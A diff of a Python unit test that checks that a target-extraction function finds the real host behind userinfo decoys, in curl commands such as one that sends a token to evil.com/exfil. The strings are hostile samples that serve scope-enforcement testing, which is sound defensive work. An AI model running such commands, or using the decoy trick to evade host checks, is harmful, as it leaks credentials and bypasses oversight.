@@ -3,14 +3,12 @@ from decepticon.middleware._command_targets import extract_targets
 
 def test_userinfo_decoy_yields_real_host_not_in_scope_label():
     targets = extract_targets("curl http://in-scope.acme.com@evil.com/")
-    assert "evil.com" in targets
-    assert "in-scope.acme.com" not in targets
+    assert targets == {"evil.com"}
 
 
 def test_userinfo_with_password_decoy_yields_real_host():
     targets = extract_targets("curl https://api.acme.com:tok@evil.com/exfil")
-    assert "evil.com" in targets
-    assert "api.acme.com" not in targets
+    assert targets == {"evil.com"}
 
 
 def test_decimal_encoded_imds_normalized_to_dotted_quad():
